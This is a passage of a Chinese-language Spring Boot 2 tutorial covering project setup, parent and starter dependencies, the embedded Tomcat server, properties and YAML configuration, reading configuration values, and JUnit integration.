color=\"#ff0000\"><b>基础篇</b></font> | Spring与SpringMVC          | 知道Spring是用来管理bean，能够基于Restful实现页面请求交互功能 |\n| <font color=\"#ff0000\"><b>基础篇</b></font> | Mybatis与Mybatis-Plus      | 基于Mybatis和MybatisPlus能够开发出包含基础CRUD功能的标准Dao模块 |\n| <font color=\"#ff0000\"><b>基础篇</b></font> | 数据库MySQL                | 能够读懂基础CRUD功能的SQL语句                                |\n| <font color=\"#ff0000\"><b>基础篇</b></font> | 服务器                     | 知道服务器与web工程的关系，熟悉web服务器的基础配置           |\n| <font color=\"#ff0000\"><b>基础篇</b></font> | maven                      | 知道maven的依赖关系，知道什么是依赖范围，依赖传递，排除依赖，可选依赖，继承 |\n| <font color=\"#ff0000\"><b>基础篇</b></font> | web技术（含vue，ElementUI) | 知道vue如何发送ajax请求，如何获取响应数据，如何进行数据模型双向绑定 |\n\n\n\n# 一、快速入门\n\n## 1.手动创建项目\n\n### ①创建Maven工程\n\n![](https://img.jwt1399.top/img/202209061927726.png)\n\n### ②配置pom文件\n\n>继承spring-boot-starter-parent；添加依赖spring-boot-starter-web\n\n```xml\n<parent>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-parent</artifactId>\n  <version>2.7.0</version>\n</parent>\n\n<dependencies>\n  <dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n  </dependency>\n</dependencies>\n```\n\n### ③创建引导类\n\n```java\n@SpringBootApplication\npublic class MainApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(MainApplication.class,args);\n    }\n}\n```\n\n`@SpringBootApplication` 注解相当于使用 `@Configuration`、`@EnableAutoConfiguration` 和 `@ComponentScan` 及他们的默认属性\n\n-  `@Configuration`作为配置类替代xml配置文件\n\n- `@EnableAutoConfiguration`启用 SpringBoot 的自动配置机制\n\n- `@ComponentScan` 自动扫描所有 Spring 组件\n\n### ④编写业务\n\n```java\n@RestController\npublic class HelloController {\n    @GetMapping\n    public String home(){\n        return \"Hello, Spring Boot 2!\";\n    }\n}\n```\n\n### ⑤运行项目\n\n直接运行主程序 `MainApplication` 中的 `main` 方法，访问 `http://127.0.0.1:8080`，将会输出`Hello, Spring Boot 2!`\n\n### ⑥简化部署\n\nSpring Boot 包括了一个 Maven 插件，它可以将项目打包成一个可执行 jar\n\n```xml\n<build>\n  <plugins>\n    <plugin>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-maven-plugin</artifactId>\n      <version>2.7.0</version>\n    </plugin>\n  </plugins>\n</build>\n```\n\n点击 IDEA 右侧的 Maven ⇒ 点击生命周期 ⇒ 点击 clean ⇒ 点击 package，target 目录下就会生成 jar 包，执行如下命令即可运行 jar 包\n\n```bash\njava -jar springBoot-learn-1.0-SNAPSHOT.jar\n```\n\n## 2.脚手架创建项目\n\n[Spring Initailizr](https://start.spring.io/)是创建 Spring Boot 工程的脚手架，以后就创建 SpringBoot 项目就不用创建空白Maven项目，而是创建 Spring Initailizr 项目\n\nSpirng程序相比，SpringBoot程序在开发的过程中各个层面均具有优势\n\n| **类配置文件**         | **Spring**   | **SpringBoot** |\n| ---------------------- | ------------ | -------------- |\n| pom文件中的坐标        | **手工添加** | **勾选添加**   |\n| web3.0配置类           | **手工制作** | **无**         |\n| Spring/SpringMVC配置类 | **手工制作** | **无**         |\n| 控制器                 | **手工制作** | **手工制作**   |\n\n### **①创建Spring Initializr工程**\n\n> 创建新模块，选择Spring Initializr，并配置模块相关基础信息\n\n创建工程时，可以切换 `starter` 服务路径为阿里云提供给的使用地址。\n\n地址：http://start.aliyun.com或https://start.aliyun.com\n\n![](https://img.jwt1399.top/img/202209061917986.png)\n\n### ②选择技术集\n\n![](https://img.jwt1399.top/img/202209061922725.png)\n\n### **③编写业务**\n\n```java\n@RestController\npublic class HelloController {\n    @GetMapping\n    public String home(){\n        return \"Hello, Spring Boot 2!\";\n    }\n}\n```\n\n### ④运行项目\n\n直接运行主程序 `MainApplication` 中的 `main` 方法，访问 `http://127.0.0.1:8080`，将会输出`Hello, Spring Boot 2!`\n\n# 二、工作流程\n\nSpringBoot带来的好处：\n\n- 起步依赖（简化依赖配置）\n  - 依赖配置的书写简化就是靠这个起步依赖达成的\n- 自动配置（简化常用工程相关配置）\n  - 配置过于繁琐，使用自动配置就可以做响应的简化，但是内部还是很复杂的\n- 辅助功能（内置服务器，……）\n  - 比如我们没有配置Tomcat服务器，但是能正常运行。\n\n下面结合入门程序来说说这些简化操作都在哪些方面进行体现的，一共分为4个方面\n\n- parent\n- starter\n- 引导类\n- 内嵌tomcat\n\n## 1.parent\n\n> SpringBoot 关注到开发者在进行开发时，往往对依赖版本的选择具有固定的搭配格式，并且这些依赖版本的选择还不能乱搭配。比如 A 技术的 2.0 版与 B 技术的 3.5 版可以合作在一起，但是和 B 技术的 3.7 版合并使用时就有冲突。于是 SpringBoot 做了无数个最合理的技术版本搭配列表，这个技术搭配列表的名字叫做<font color=\"#ff0000\"><b>parent</b></font>。\n\n一句话总结：<font color=\"#ff0000\"><b>使用parent可以帮助开发者进行版本的统一管理</b></font>\n\n那SpringBoot又是如何做到这一点的呢？可以查阅SpringBoot的配置源码，看到这些定义\n\n- 项目中的pom.xml中继承了一个坐标\n\n```xml\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.5.4</version>\n</parent>\n```\n\n- 打开后可以查阅到其中又继承了一个坐标\n\n```xml\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-dependencies</artifactId>\n    <version>2.5.4</version>\n</parent>\n```\n\n- 这个坐标中定义了两组信息，\n\n  - 第一组是各式各样的**依赖版本号**\n\n    ```xml\n    <properties>\n        <activemq.version>5.16.3</activemq.version>\n        <aspectj.version>1.9.7</aspectj.version>\n        <assertj.version>3.19.0</assertj.version>\n        <javax-json.version>1.1.4</javax-json.version>\n        <javax-websocket.version>1.1</javax-websocket.version>\n        <jetty-el.version>9.0.48</jetty-el.version>\n        <junit.version>4.13.2</junit.version>\n        ......\n    </properties>\n    ```\n\n  - 第二组是各式各样的的**依赖坐标信息**。可以看出依赖坐标定义中没有具体的依赖版本号，而是引用了第一组信息中定义的依赖版本属性值\n\n    ```xml\n    <dependencyManagement>\n        <dependencies>\n            <dependency>\n                <groupId>org.hibernate</groupId>\n                <artifactId>hibernate-core</artifactId>\n                <version>${hibernate.version}</version>\n            </dependency>\n            <dependency>\n                <groupId>junit</groupId>\n                <artifactId>junit</artifactId>\n                <version>${junit.version}</version>\n            </dependency>\n        </dependencies>\n    </dependencyManagement>\n    ```\n\n<font color=\"#ff0000\"><b>关注</b></font>：上面的依赖坐标定义是出现在\\<dependencyManagement>标签中的，其实是对引用坐标的依赖管理，并不是实际使用的坐标。因此当你的项目中继承了这组parent信息后，在不使用对应坐标的情况下，这组定义是不会具体导入某个依赖的\n\n<font color=\"#ff0000\"><b>关注</b></font>：因为在maven中继承机会只有一次，上述继承的格式还可以切换成导入的形式进行，并且在阿里云的starter创建工程时就使用了此种形式\n\n```xml\n<dependencyManagement>\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-dependencies</artifactId>\n            <version>${spring-boot.version}</version>\n            <type>pom</type>\n            <scope>import</scope>\n        </dependency>\n    </dependencies>\n</dependencyManagement>\n```\n\n**总结**\n\n1. 开发SpringBoot程序要继承spring-boot-starter-parent\n2. spring-boot-starter-parent中定义了若干个依赖管理\n3. 继承parent模块可以避免多个依赖使用相同技术时出现依赖版本冲突\n4. 继承parent的形式也可以采用引入依赖的形式实现效果\n\n## 2.starter\n\n> SpringBoot 关注到开发者在实际开发时，对于依赖坐标的使用往往都有一些固定的组合方式，比如使用 spring-webmvc 就一定要使用 spring-web。每次都要固定搭配着写，非常繁琐。于是 SpringBoot 把所有的技术使用固定搭配格式都给开发出来，以后你用某个技术，就不用一次写一堆依赖了，直接用固定搭配格式就好了。这个固定技术搭配的名字叫做<font color=\"#ff0000\"><b>starter</b></font>。\n\n一句话总结：<font color=\"#ff0000\"><b>使用starter可以帮助开发者减少依赖配置</b></font>\n\n那SpringBoot又是如何做到这一点的呢？可以查阅SpringBoot的配置源码，看到这些定义\n\n- 项目中的pom.xml定义了使用SpringMVC技术，但是并没有写SpringMVC的坐标，而是添加了一个名字中包含starter的依赖\n\n`command + shift + option + U`：以图的方式显示项目中依赖之间的关系。\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n- 在spring-boot-starter-web中又定义了若干个具体依赖的坐标\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-json</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-tomcat</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-web</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n</dependencies>\n```\n\n发现里面有个 spring-boot-starter-json。看名称就知道，这个是与json有关的坐标了，但是看名字发现和最后两个又不太一样，它的名字中也有starter，打开看看里面有什么？\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-web</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>com.fasterxml.jackson.core</groupId>\n        <artifactId>jackson-databind</artifactId>\n        <version>2.12.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>com.fasterxml.jackson.datatype</groupId>\n        <artifactId>jackson-datatype-jdk8</artifactId>\n        <version>2.12.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>com.fasterxml.jackson.datatype</groupId>\n        <artifactId>jackson-datatype-jsr310</artifactId>\n        <version>2.12.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>com.fasterxml.jackson.module</groupId>\n        <artifactId>jackson-module-parameter-names</artifactId>\n        <version>2.12.4</version>\n        <scope>compile</scope>\n    </dependency>\n</dependencies>\n```\n\n我们可以发现，这个starter中又包含了若干个坐标，其实就是使用SpringMVC开发通常都会使用到Json，使用json又离不开这里面定义的这些坐标，看来还真是方便，SpringBoot把我们开发中使用的东西能用到的都给提前做好了。你仔细看完会发现，里面有一些你没用过的。的确会出现这种过量导入的可能性，没关系，可以通过maven中的排除依赖剔除掉一部分。不过你不管它也没事，大不了就是过量导入呗。\n\n到这里基本上得到了一个信息，使用starter可以帮开发者快速配置依赖关系。以前写依赖3个坐标的，现在写导入一个就搞定了，就是加速依赖配置的。\n\n**starter与parent的区别**\n\n​\t朦朦胧胧中感觉starter与parent好像都是帮助我们简化配置的，但是功能又不一样，梳理一下。\n\n​\t<font color=\"#ff0000\"><b>starter</b></font>是一个坐标中定了若干个坐标，以前写多个的，现在写一个，<font color=\"#ff0000\"><b>是用来减少依赖配置的书写量的</b></font>\n\n​\t<font color=\"#ff0000\"><b>parent</b></font>是定义了几百个依赖版本号，以前写依赖需要自己手工控制版本，现在由SpringBoot统一管理，\n\n这样就不存在版本冲突了，<font color=\"#ff0000\"><b>是用来减少依赖冲突的</b></font>\n\n**实际开发应用方式**\n\n- 实际开发中如果需要用什么技术，先去找有没有这个技术对应的starter\n\n  - 如果有对应的starter，直接写starter，而且无需指定版本，版本由parent提供\n  - 如果没有对应的starter，手写坐标即可\n\n- 实际开发中如果发现坐标出现了冲突现象，确认你要使用的可行的版本号，使用手工书写的方式添加对应依赖，覆盖SpringBoot提供给我们的配置管理\n\n  - 方式一：直接写坐标\n  - 方式二：覆盖\\<properties>中定义的版本号，在当前项目里面重写配置，如下面的代码\n\n  ```xml\n  <properties>\n      <mysql.version>5.1.43</mysql.version>\n  </properties>\n  ```\n\n<font color=\"#f0f\"><b>温馨提示</b></font>\n\n​\t[SpringBoot官方](https://docs.spring.io/spring-boot/docs/current/reference/html/using.html#using.build-systems.starters)给出了好多个starter的定义，方便我们使用，而且名称都是如下格式\n\n```JAVA\n命名规则：spring-boot-starter-技术名称\n```\n\n那非官方定义的也有吗？有的，而且名称都是如下格式\n\n```java\n命名规则：技术名称-spring-boot-starter \n   或者: 技术名称-boot-starter（技术名称过长，简化命名）\n```\n\n**总结**\n\n1. 开发SpringBoot程序需要导入坐标时通常导入对应的starter\n2. 每个不同的starter根据功能不同，通常包含多个依赖坐标\n3. 使用starter可以实现快速配置的效果，达到简化配置的目的\n\n## 3.引导类\n\n程序是如何运行的。目前程序运行的入口就是SpringBoot工程创建时自带的那个类了，带有main方法的那个类，运行这个类就可以启动SpringBoot工程的运行\n\n```java\n@SpringBootApplication\npublic class SpringbootApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(SpringbootApplication.class, args);\n    }\n}\n```\n\nSpringBoot本身是为了加速Spring程序的开发的，而Spring程序运行的基础是需要创建自己的Spring容器对象（IoC容器）并将所有的对象交给Spring的容器管理，也就是一个一个的Bean。当这个类运行后就会产生一个Spring容器对象，并且可以将这个对象保存起来，通过容器对象直接操作Bean。\n\n```java\n@SpringBootApplication\npublic class SpringbootApplication {\n  public static void main(String[] args) {\n      //1、返回我们IOC容器\n      ConfigurableApplicationContext run = SpringApplication.run(MainApplication.class, args);\n\n      //2、查看容器里面的组件\n      String[] names = run.getBeanDefinitionNames();\n      for (String name : names) {\n          System.out.println(name);\n      }\n  }\n}\n```\n\n作为一个引导类最典型的特征就是当前类上方声明了一个注解<font color=\"#ff0000\"><b>@SpringBootApplication</b></font>\n\n**总结**\n\n1. SpringBoot工程提供引导类用来启动程序\n2. SpringBoot工程启动后创建并初始化Spring容器\n\n## 4.内嵌tomcat\n\n当前我们做的SpringBoot入门案例勾选了Spirng-web的功能，并且导入了对应的starter。\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n​\tSpringBoot发现，既然你要做web程序，肯定离不开使用web服务器，我再帮你搞一个web服务器，你要愿意用的，直接使用就好了，干脆我再多给你几种选择，你随便切换。万一你不想用我给你提供的，也行，你可以自己搞。\n\n​\t由于这个功能不属于程序的主体功能，可用可不用，于是乎SpringBoot将其定位成辅助功能。\n\n​\t下面就围绕着这个内置的web服务器，也可以说是内置的tomcat服务器来研究几个问题\n\n1. 这个服务器在什么位置定义的？\n2. 这个服务器是怎么运行的？\n3. 这个服务器如果想换怎么换？\n\n**内嵌Tomcat定义位置**\n\n​\t说到定义的位置，我们就想，如果我们不开发web程序，用的着web服务器吗？肯定用不着啊。那如果这个东西被加入到你的程序中，伴随着什么技术进来的呢？肯定是web相关的功能啊，没错，就是前面导入的web相关的starter做的这件事。\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n​\t打开查看web的starter导入了哪些东西\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-json</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-tomcat</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-web</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n</dependencies>\n```\n\n​\t第三个依赖就是这个tomcat对应的东西了，居然也是一个starter，再打开看看\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>jakarta.annotation</groupId>\n        <artifactId>jakarta.annotation-api</artifactId>\n        <version>1.3.5</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.apache.tomcat.embed</groupId>\n        <artifactId>tomcat-embed-core</artifactId>\n        <version>9.0.52</version>\n        <scope>compile</scope>\n        <exclusions>\n            <exclusion>\n                <artifactId>tomcat-annotations-api</artifactId>\n                <groupId>org.apache.tomcat</groupId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n    <dependency>\n        <groupId>org.apache.tomcat.embed</groupId>\n        <artifactId>tomcat-embed-el</artifactId>\n        <version>9.0.52</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.apache.tomcat.embed</groupId>\n        <artifactId>tomcat-embed-websocket</artifactId>\n        <version>9.0.52</version>\n        <scope>compile</scope>\n        <exclusions>\n            <exclusion>\n                <artifactId>tomcat-annotations-api</artifactId>\n                <groupId>org.apache.tomcat</groupId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n</dependencies>\n```\n\n这里面有一个核心的坐标，tomcat-embed-core，叫做tomcat内嵌核心。就是这个东西把tomcat功能引入到了我们的程序中。目前解决了第一个问题。谁把tomcat引入到程序中的？spring-boot-starter-web中的spring-boot-starter-tomcat做的。\n\n**内嵌Tomcat运行原理**\n\nTomcat服务器是一款软件，而且是一款使用java语言开发的软件下面的问题来了，既然是使用java语言开发的，运行的时候肯定符合java程序运行的原理，java程序运行靠的是什么？对象呀，一切皆对象，万物皆对象。那tomcat运行起来呢？也是对象。\n\n​\t如果是对象，那Spring容器是用来管理对象的，tomcat服务器运行其实是以对象的形式在Spring容器中运行的。具体运行的是什么呢？其实就是上前面提到的那个tomcat内嵌核心\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.apache.tomcat.embed</groupId>\n        <artifactId>tomcat-embed-core</artifactId>\n        <version>9.0.52</version>\n        <scope>compile</scope>\n    </dependency>\n</dependencies>\n```\n\n那既然是个对象，如果把这个对象从Spring容器中去掉是不是就没有web服务器的功能呢？是这样的，通过依赖排除可以去掉这个web服务器功能\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n        <exclusions>\n            <exclusion>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-tomcat</artifactId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n</dependencies>\n```\n\n重新启动程序可以观察到程序运行了，但是并没有像之前那样运行后会等着用户发请求，而是直接停掉了。\n\n**更换内嵌Tomcat**\n\n根据SpringBoot的工作机制，用什么技术，加入什么依赖就行了。SpringBoot提供了3款内置的服务器\n\n- tomcat(默认)：apache出品，粉丝多，应用面广，负载了若干较重的组件\n\n- jetty：更轻量级，负载性能远不及tomcat\n\n- undertow：负载性能勉强跑赢tomcat\n\n\n想用哪个，加个坐标就OK。前提是把tomcat排除掉，因为tomcat是默认加载的。\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n        <exclusions>\n            <exclusion>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-tomcat</artifactId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-jetty</artifactId>\n    </dependency>\n</dependencies>\n```\n\n现在就已经成功替换了web服务器，核心思想就是用什么加入对应坐标就可以了。如果有starter，优先使用starter。\n\n**总结**\n\n1. 内嵌Tomcat服务器是SpringBoot辅助功能之一\n2. 内嵌Tomcat工作原理是将Tomcat服务器作为对象运行，并将该对象交给Spring容器管理\n3. 变更内嵌服务器思想是去除现有服务器，添加全新的服务器\n\n# 三、基础配置\n\n## 1.属性配置\n\nSpringBoot 通过 resources 目录下的配置文件 `application.properties` 就可以修改默认的配置\n\n例如 将 tomcat 的默认端口8080改成80，输入port后，自带提示带提示\n\n```properties\nserver.port=80\n```\n\n重新运行，浏览器输入`http://localhost`即可\n\n这个配置项和什么有关？在pom中注释掉导入的spring-boot-starter-web，然后刷新工程，你会发现配置的提示消失了。闹了半天是设定使用了什么技术才能做什么配置。\n\n更多配置项请参考：[Common Application Properties](https://docs.spring.io/spring-boot/docs/current/reference/html/application-properties.html#appendix.application-properties)\n\n**总结**\n\n1. SpringBoot中导入对应starter后，提供对应配置属性\n2. 书写SpringBoot配置采用关键字+提示形式书写\n\n## 2.配置文件分类\n\nSpringBoot除了支持properties格式的配置文件，还支持另外两种格式的配置文件。分别如下:\n\n- properties格式\n\n```properties\nserver.port=80\n```\n\n- yml格式（`推荐使用`）\n\n```yaml\nserver:\n  port: 81\n```\n\n- yaml格式\n\n```yaml\nserver:\n  port: 82\n```\n\nyml 格式和 yaml 格式除了文件名后缀不一样，格式完全一样，所以可以合并成一种格式来看。\n\n- 三种格式中推荐使用 yml 格式\n- 配置文件间的加载优先级\tproperties（最高）>  yml  >  yaml（最低）\n- 不同配置文件中相同配置按照加载优先级相互覆盖，不同配置文件中不同配置全部保留 \n\n## 3.yaml文件格式\n\nYAML（YAML Ain't Markup Language） 是一种较为人性化的**数据序列化语言** ，语法比较简洁直观，特点是使用空格来表达层次结构，其最大优势在于**数据结构**方面的表达，所以 YAML 更多应用于**编写配置文件**，其文件一般以 **.yml** 为后缀。\n\nyaml 非常适合用来做以数据为中心的配置文件。所以我们可以用 yaml 代替之前的 properties\n\n### **①基本语法**\n\n- key: value    \n  - “`:`”后有空格\n- 大小写敏感\n- 使用缩进表示层级关系\n- 缩进不允许使用 tab，只允许空格\n- 缩进的空格数不重要，只要相同层级的元素左对齐即可\n- '#'表示注释\n- 字符串无需加引号，如果要加：\n  - 双引号表示字符串内容会被转义\n  - 单引号表示字符串内容不会被转义\n\n**数据类型**\n\n- 普通数据：单个的、不可再分的值。date、boolean、string、number、null\n\n```yaml\nk: v\n```\n\n- 对象：键值对的集合。map、hash、set、object \n\n```yaml\n行内写法：  k: {k1:v1,k2:v2,k3:v3}\n#或\nk: \n\tk1: v1\n  k2: v2\n  k3: v3\n```\n\n- 数组：一组按次序排列的值。array、list、queue\n\n```yaml\n行内写法：  k: [v1,v2,v3]\n#或\nk:\n - v1\n - v2\n - v3\n \nusers:\t\t\t\t\t\t\t #对象数组格式\n  - name: Tom\n   \tage: 4\n  - name: Jerry\n    age: 5\t\t    \nusers2: [ { name:Tom , age:4 } , { name:Jerry , age:5 } ]\t#对象数组缩略格式\n```\n\n**示例**\n\n```java\n@Data\npublic class Person {\n\t\n\tprivate String userName;\n\tprivate Boolean boss;\n\tprivate Date birth;\n\tprivate Integer age;\n\tprivate Pet pet;\n\tprivate String[] interests;\n\tprivate List<String> animal;\n\tprivate Map<String, Object> score;\n\tprivate Set<Double> salarys;\n\tprivate Map<String, List<Pet>> allPets;\n}\n\n@Data\npublic class Pet {\n\tprivate String name;\n\tprivate Double weight;\n}\n```\n\n```yaml\n# yaml表示以上对象\nperson:\n  userName: zhangsan\n  boss: false\n  birth: 2019/12/12 20:12:33\n  age: 18\n  pet: \n    name: tomcat\n    weight: 23.4\n  interests: [篮球,游泳]\n  animal: \n    - jerry\n    - mario\n  score:\n    english: \n      first: 30\n      second: 40\n      third: 50\n    math: [131,140,148]\n    chinese: {first: 128,second: 136}\n  salarys: [3999,4999.98,5999.99]\n  allPets:\n    sick:\n      - {name: tom}\n      - {name: jerry,weight: 47}\n    health: [{name: mario,weight: 47}]\n```\n\n### ②数据引用\n\n如果你在书写yaml数据时，经常出现如下现象，比如很多个文件都具有相同的目录前缀\n\n```yaml\ncenter:\n\tdataDir: /usr/local/fire/data\n    tmpDir: /usr/local/fire/tmp\n    logDir: /usr/local/fire/log\n    msgDir: /usr/local/fire/msgDir\n```\n\n或者\n\n```yaml\ncenter:\n\tdataDir: D:/usr/local/fire/data\n    tmpDir: D:/usr/local/fire/tmp\n    logDir: D:/usr/local/fire/log\n    msgDir: D:/usr/local/fire/msgDir\n```\n\n​\t这个时候你可以使用引用格式来定义数据，其实就是搞了个变量名，然后引用变量了，格式如下：\n\n```yaml\nbaseDir: /usr/local/fire\n\tcenter:\n    dataDir: ${baseDir}/data\n    tmpDir: ${baseDir}/tmp\n    logDir: ${baseDir}/log\n    msgDir: ${baseDir}/msgDir\n```\n\n还有一个注意事项，在书写字符串时，如果需要使用转义字符，需要将数据字符串使用双引号包裹起来\n\n```yaml\nlesson: \"Spring\\tboot\\nlesson\"\n```\n\n**总结**\n\n1. 在配置文件中可以使用${属性名}方式引用属性值\n2. 如果属性中出现特殊字符，可以使用双引号包裹起来作为字符解析\n\n## 4.yaml数据读取\n\n### ①读取单一数据\n\n​\tyaml中保存的单个数据，可以使用Spring中的注解直接读取，使用`@Value`可以读取单个数据，属性名引用方式：<font color=\"#ff0000\"><b>${一级属性名.二级属性名……}</b></font>\n\n<img src=\"https://img.jwt1399.top/img/202209062142453.png\" style=\"zoom:80%;\" />\n\n**总结**\n\n1. 使用@Value读取单个数据\n2. 如果数据存在多层级，依次书写层级名称即可\n\n### ②读取全部数据\n\n​\t读取单一数据可以解决读取数据的问题，但是如果定义的数据量过大，这么一个一个书写肯定会累死人的，SpringBoot提供了一个对象，能够把所有的数据都封装到这一个对象中，这个对象叫做Environment，使用自动装配注解 @Autowired 可以将所有的yaml数据封装到这个对象中\n\n<img src=\"https://img.jwt1399.top/img/202209062148870.png\" style=\"zoom:80%;\" />\n\n数据封装到了Environment对象中，通过方法 **getProperty(\"属性名\")** 获取数据\n\n**总结**\n\n1. 使用Environment对象封装全部配置信息\n2. 使用@Autowired自动装配数据到Environment对象中\n\n### ③读取对象数据\n\n单一数据读取书写比较繁琐，全数据封装又封装的太厉害了，每次拿数据还要一个一个的 getProperty() ，总之用起来都不是很舒服。由于Java是一个面向对象的语言，很多情况下，我们会将一组数据封装成一个对象。SpringBoot也提供了可以将一组yaml对象数据封装一个Java对象的操作\n\n​\t首先定义一个对象，并将该对象纳入Spring管控的范围，也就是定义成一个bean，然后使用注解`@ConfigurationProperties(prefix = \"数据前缀\")`  指定该对象加载哪一组yaml中配置的信息。\n\n<img src=\"https://img.jwt1399.top/img/202209062150640.png\"  style=\"zoom:80%;\" />\n\n@ConfigurationProperties 必须指定加载的数据前缀是什么，这样当前前缀下的所有属性就封装到这个对象中。记得数据属性名要与对象的变量名一一对应，不然没法封装。其实以后如果你要定义一组数据自己使用，就可以先写一个对象，然后定义好属性，下面到配置中根据这个格式书写即可。\n\n<img src=\"https://img.jwt1399.top/img/202209062151985.png\" style=\"zoom:80%;\" />\n\n**总结**\n\n1. 使用@ConfigurationProperties注解绑定配置信息到封装类中\n2. 封装类需要定义为Spring管理的bean，否则无法进行属性注入\n\n​\t<font color=\"#f0f\"><b>温馨提示</b></font>\n\n​\t\t细心的小伙伴会发现一个问题，自定义的这种数据在yaml文件中书写时没有弹出提示，解决方法如下。\n\n### ④配置提示效果\n\n> 配置提示 configuration-processor\n\n自定义的类和配置文件绑定一般没有提示。若要提示，添加如下依赖：\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-configuration-processor</artifactId>\n  <optional>true</optional>\n</dependency>\n\n<build>\n  <plugins>\n    <plugin>\n      <configuration>\n        <excludes>\n          <exclude>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-configuration-processor</artifactId>\n          </exclude>\n        </excludes>\n      </configuration>\n    </plugin>\n  </plugins>\n</build>\n```\n\n再在自定义的类上添加配置注解\n\n```java\n@ConfigurationProperties(prefix = \"xxx\")//读取文件中所有以xxx开头的属性，并和bean中的字段进行匹配\n@Component //标注类为Spring容器的Bean\n```\n\n测试\n\n```java\n@ConfigurationProperties(prefix = \"user\")\n@Component //标注类为Spring容器的Bean\n@NoArgsConstructor //无参构造\n@AllArgsConstructor //有参构造\n@Data\n@EqualsAndHashCode\npublic class User {\n   private String name;\n   private Integer age;\n}\n```\n\n在配置文件 application.yml 中输入 user 就会得到 name 和 age 的输入提示\n\n# 四、整合技术\n\n整合第三方技术通用方式\n\n- 导入对应的starter\n- 配置非默认值对应的配置项\n\n## 1.整合JUnit\n\n- 导入测试对应的starter，初始化项目时此项是默认导入的\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-test</artifactId>\n  <scope>test</scope>\n</dependency>\n```\n\n- 在测试类上添加注解 @SpringBootTest ，在方法上添加注解 @Test\n\n```java\n@SpringBootTest\nclass SpringbootJunitTests {\n    //注入你要测试的对象\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        //执行要测试的对象对应的方法\n        bookDao.save();\n        System.out.println(\"two...\");\n    }\n}\n```\n\n- 测试类如果存在于引导类所在包或子包中无需指定引导类，测试类如果不存在于引导类所在的包或子包中需要通过classes属性指定引导类\n\n第一种方式使用属性的形式进行，在注解 @SpringBootTest 中添加 classes 属性指定配置类\n\n```java\n@SpringBootTest(classes = 